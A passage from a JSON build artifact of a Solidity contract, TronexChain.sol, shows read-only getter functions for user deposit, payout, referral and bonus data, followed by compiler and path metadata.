payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status  ) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {\r\n        return (total_users, total_deposited, total_withdraw );\r\n    }\r\n     \r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/ATRON RAMESH/contracts/TronexChain.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-10-26T08:27:00.166Z"
}